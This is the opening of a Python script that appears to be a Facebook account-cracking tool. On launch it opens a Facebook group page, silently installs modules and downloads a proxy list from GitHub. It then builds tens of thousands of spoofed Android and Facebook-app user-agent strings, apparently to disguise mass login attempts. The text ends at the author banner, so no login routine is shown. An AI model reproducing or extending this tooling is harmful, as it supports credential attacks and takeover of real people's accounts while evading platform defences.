from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://www.facebook.com/groups/989799615362877/?ref=share/')
print('\n\033[1;37m install modules...\n It will take some seconds...')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python MASUM.py')
except:pass

try:
	proxy= requests.get('https://raw.githubusercontent.com/Luciferhck143/proxy/main/proxy.txt').text
	open('proxy.txt','w').write(proxy)
except Exception as e:
	print('\x1b[1;95m[√] OYY BHOTNI KA TODA WAIT KAR...')
	
proxy=open('proxy.txt','r').read().splitlines()

       
fbks=(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
sm = random.choice(['SM-G975F','SM-G970F','SM-N960F','SM-N975F','SM-G965F','SM-N970F','SM-G986B','SM-G975U','SM-G960F','SM-G988B','SM-A515F','SM-A715F','SM-G988U','SM-A505F','SM-N986B','SM-N950F','SM-A207F','SM-A107F','SM-G977B','SM-A217F','SM-A205F','SM-G781B','SM-G960U','SM-G985F','SM-G986U','SM-G980F','SM-A515U','SM-G977U','SM-G973F','SM-A307F','SM-A107M','SM-A217U','SM-G977V','SM-A125F','SM-G988N','SM-N975U','SM-A716B','SM-G981U','SM-G986N','SM-A505U','SM-A705F','SM-G977P','SM-A207M','SM-A115M','SM-N986U','SM-A205U','SM-A102U','SM-A715U','SM-A217M','SM-G986W','SM-G981B','SM-A015M','SM-A515W','SM-G781U','SM-A307GT','SM-N975W','SM-G980U','SM-A207U','SM-A115U','SM-G977W','SM-A125U','SM-A705W','SM-A102W','SM-A716U','SM-G981V','SM-A013M','SM-A515N','SM-A217N','SM-A515U1','SM-G780F','SM-A307FN','SM-G988W','SM-N986N','SM-A015U','SM-A115W','SM-G988U1','SM-A125N','SM-A205W','SM-A705M','SM-A102N','SM-A515GN','SM-A716W','SM-G981W','SM-A013F','SM-A515F/DS','SM-A217F/DS','SM-N975N','SM-A307G','SM-G977T','SM-A515N/DS','SM-G981U1','SM-A102F','SM-A716U1','SM-A505G','SM-A115F','SM-G9880','SM-A217N/DS','SM-A015F','SM-A715F/DS','SM-A515W/DS','SM-G975FC'])


#ᴍᴀsᴜᴍ USERAGENT METHOD
def randBuildvsskj():
    END = '[FBAN/EMA;FBBV/420441389;FBAV/397.0.0.23.404;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    satan = random.choice(["Dalvik/2.1.0 (Linux; U; Android 6.0; LGLS991 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.0; AS-503 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 9; TX6 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2389 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 10; K1 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; A103ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11.1; Q96MAX Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 12; SM-N976Q Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS-TVX19A Build/PTM5.200218.935)","Dalvik/2.1.0 (Linux; U; Android 9; B UHD Android TV Build/PTO2.220426.001)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G970N Build/PQ3A.190605.05171606)","Dalvik/2.1.0 (Linux; U; Android 10; Deco 4K con Android TV Build/QTG1.221129.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CC54 Build/65.1.A.5.50)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 10; A95XF3Air Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005D Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android UpsideDownCake Build/UPB2.230407.019)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.447)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BT52 Build/62.2.A.0.481)","Dalvik/2.1.0 (Linux; U; Android 9; Dell Chromebook 11 (3180) Build/R103-14816.131.0)","Dalvik/2.1.0 (Linux; U; Android 5.1; JALA.V158F3P.E6 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-20)","Dalvik/2.1.0 (Linux; U; Android 9; AT_SmartScreen Build/RTK2851P)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2021) Build/S1RMS32.68-43-16-9)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; ASUS_Z011D Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 12; 100071483 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 9296Q Build/RKQ1.210107.001)","Dalvik/2.1.0 (Linux; U; Android 9; T10LTE Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; YMP-A1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12.0; uis8581a2h10_Automotive Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-85-4-2)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; S22 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; SM-T515 Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; SM-J415FN Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; CPH2305 Build/SKQ1.221119.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2040 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SM-S9160 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; M2010J19SL Build/SKQ1.211202.001)","Dalvik/2.1.0 (Linux; U; Android 6.0; ALFA_8MB Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; 22127PC95I Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A7050 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g 5G (2022) Build/S1SAS32.47-59-19)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; LG-LS995 Build/KOT49I.LS995ZVB)","Dalvik/2.1.0 (Linux; U; Android 9; moto e6s Build/POE29.288-46-6)","Dalvik/2.1.0 (Linux; U; Android 11; AI PONT Build/RTM3.211215.274)","Dalvik/2.1.0 (Linux; U; Android 9; kukui Build/R113-15393.58.0)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; reederA7iC Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 11; T6L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12.0; PG11 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-25-15-15)","Dalvik/2.1.0 (Linux; U; Android 13; V2025 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; 5008D_EEA Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; Optima 8002 3G TS8001PG Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 6.0; Lenovo TB3-730F Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 11; p281 Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 13; LE2110 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook 15 (CB515-1H, CB515-1HT) Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 10; S14 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 9; AIWA 2K TV Build/PTO7.200805.001)","Dalvik/2.1.0 (Linux; U; Android 13; P80 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042)","Dalvik/2.1.0 (Linux; U; Android 12; M53 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; SmartTV Build/SP1A.210812.015)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RAS33.55-15-10-1)","Dalvik/2.1.0 (Linux; U; Android 10; OTT2100 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; A201OP Build/SKQ1.220303.001)","Dalvik/2.1.0 (Linux; U; Android 12; M1582C_MAX Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; ONEtv Build/QTG1.220808.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LM-Q925S Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 11; TPC-G1011LTE Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris50 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; 2303ERA42L Build/TP1A.220624.014)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; TURKCELL T50 Build/KVT49L)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-64-11)","Dalvik/2.1.0 (Linux; U; Android 10.0; X96MINI Build/NHG47L)","Dalvik/2.1.0 (Linux; Android 7.1.2; vivo X9s L Build/3cbyn; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 12; TB310FU Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; Android 7.1.2; PAAM00 Build/31wbo; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 9; grunt Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; Android 7.1.2; ARE-AL10 Build/v7ne3; wv) AppleWebKit","Dalvik/2.1.0 (Linux; Android 7.1.2; 4G Build/5tqfr; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 13; V2135 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; grunt Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 12; STAR5 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10.0; P43 Pro Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) Build/S1RFS32.27-25-11-9)","Dalvik/2.1.0 (Linux; U; Android 11; GS290 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 9; Orange Neva jet Build/PKQ1.190519.001)","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3MG Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; 22031116BG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3301 Build/SKQ1.221119.001)","Dalvik/2.1.0 (Linux; U; Android 11; L4T Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; MeMOPAD 10FHD LTE Build/NMF26O)","Dalvik/2.1.0 (Linux; U; Android 11; G91 Max Build/RP1A.200720.011)"])+END
    return satan


#ғᴏʀʜᴀᴅ USERAGENT METHOD
def satn_ua():
  for i in range(100):
    version_ = str(random.randint(4, 14)) + "." + str(random.randint(0, 4)) + "." + str(random.randint(0, 4))
    model_ = "SM-" + str(random.randint(100, 999))
    brand_name_ = random.choice(["Samsung","Vivo","Tecno","Infinix","Nokia","Realme"])
    width_ = random.randint(320, 1080)
    height_ = random.randint(480, 1920)
    user_agent =('[Dalvik/1.6.0 (Linux; U; Android 7.1.1; 768 Build/1280) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/106;FBDM/{density=3.0,width=768,height=1280};FBLC/it_IT;FBRV/106.0.0.26.68;FBCR/Etisalat Pak;FBMF/Samsung_Galaxy_Note_20_Ultra;FBBD/Samsung_Galaxy_Note_20_Ultra;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_Note_20_Ultra_7_1_1;FBSV/7.1.1;FBOP/1;FBCA/x86:armeabi-v7a;]')

#user agent
stn_ua =  random.choice(["Dalvik/2.1.0 (Linux; U; Android 13; SH-M19 Build/S3020)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SE1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.B1)","Dalvik/2.1.0 (Linux; U; Android 6.0; LGLS991 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.0; AS-503 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 9; TX6 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2389 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 10; K1 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; A103ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11.1; Q96MAX Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 12; SM-N976Q Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS-TVX19A Build/PTM5.200218.935)","Dalvik/2.1.0 (Linux; U; Android 9; B UHD Android TV Build/PTO2.220426.001)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G970N Build/PQ3A.190605.05171606)","Dalvik/2.1.0 (Linux; U; Android 10; Deco 4K con Android TV Build/QTG1.221129.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CC54 Build/65.1.A.5.50)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 10; A95XF3Air Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005D Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android UpsideDownCake Build/UPB2.230407.019)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.447)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BT52 Build/62.2.A.0.481)","Dalvik/2.1.0 (Linux; U; Android 9; Dell Chromebook 11 (3180) Build/R103-14816.131.0)","Dalvik/2.1.0 (Linux; U; Android 5.1; JALA.V158F3P.E6 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-20)","Dalvik/2.1.0 (Linux; U; Android 9; AT_SmartScreen Build/RTK2851P)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2021) Build/S1RMS32.68-43-16-9)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; ASUS_Z011D Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 12; 100071483 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 9296Q Build/RKQ1.210107.001)","Dalvik/2.1.0 (Linux; U; Android 9; T10LTE Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; YMP-A1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12.0; uis8581a2h10_Automotive Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-85-4-2)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; S22 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; SM-T515 Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; SM-J415FN Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; CPH2305 Build/SKQ1.221119.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2040 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SM-S9160 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; M2010J19SL Build/SKQ1.211202.001)","Dalvik/2.1.0 (Linux; U; Android 6.0; ALFA_8MB Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; 22127PC95I Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A7050 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g 5G (2022) Build/S1SAS32.47-59-19)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; LG-LS995 Build/KOT49I.LS995ZVB)","Dalvik/2.1.0 (Linux; U; Android 9; moto e6s Build/POE29.288-46-6)","Dalvik/2.1.0 (Linux; U; Android 11; AI PONT Build/RTM3.211215.274)","Dalvik/2.1.0 (Linux; U; Android 9; kukui Build/R113-15393.58.0)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; reederA7iC Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 11; T6L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12.0; PG11 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-25-15-15)","Dalvik/2.1.0 (Linux; U; Android 13; V2025 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; 5008D_EEA Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; Optima 8002 3G TS8001PG Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 6.0; Lenovo TB3-730F Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 11; p281 Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 13; LE2110 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook 15 (CB515-1H, CB515-1HT) Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 10; S14 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 9; AIWA 2K TV Build/PTO7.200805.001)","Dalvik/2.1.0 (Linux; U; Android 13; P80 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042)","Dalvik/2.1.0 (Linux; U; Android 12; M53 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; SmartTV Build/SP1A.210812.015)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RAS33.55-15-10-1)","Dalvik/2.1.0 (Linux; U; Android 10; OTT2100 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; A201OP Build/SKQ1.220303.001)","Dalvik/2.1.0 (Linux; U; Android 12; M1582C_MAX Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; ONEtv Build/QTG1.220808.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LM-Q925S Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 11; TPC-G1011LTE Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris50 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; 2303ERA42L Build/TP1A.220624.014)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; TURKCELL T50 Build/KVT49L)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-64-11)","Dalvik/2.1.0 (Linux; U; Android 10.0; X96MINI Build/NHG47L)","Dalvik/2.1.0 (Linux; Android 7.1.2; vivo X9s L Build/3cbyn; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 12; TB310FU Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; Android 7.1.2; PAAM00 Build/31wbo; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 9; grunt Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; Android 7.1.2; ARE-AL10 Build/v7ne3; wv) AppleWebKit","Dalvik/2.1.0 (Linux; Android 7.1.2; 4G Build/5tqfr; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 13; V2135 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; grunt Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 12; STAR5 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10.0; P43 Pro Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) Build/S1RFS32.27-25-11-9)","Dalvik/2.1.0 (Linux; U; Android 11; GS290 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 9; Orange Neva jet Build/PKQ1.190519.001)","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3MG Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; 22031116BG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3301 Build/SKQ1.221119.001)",])


ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537. 36'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)


logo=("""\033[1;91m     

  
      dBBBBBBb dBBBBBb  .dBBBBP   dBP dBP dBBBBBBb     dBBBb  dBBBBP   
       '   dB'      BB  BP                 '   dB'           dB'.BP    
    dB'dB'dB'   dBP BB  `BBBBb  dBP dBP dB'dB'dB'       dBP dB:.BP     
   dB'dB'dB'   dBP  BB     dBP dBP_dBP dB'dB'dB'       dBP dB'.BP      
  dB'dB'dB'   dBBBBBBBdBBBBP' dBBBBBP dB'dB'dB'       dBP dBBBBP       
                                                                       

                                               


----------------------------------------------
 AUTOR             : ᴍᴀsᴜᴍ 10
 WHATSAPP     : 0173------26
 VERISON          :0.4
 FRIEND             :ʜʀɪᴅᴏʏ ᴠᴀɪ 
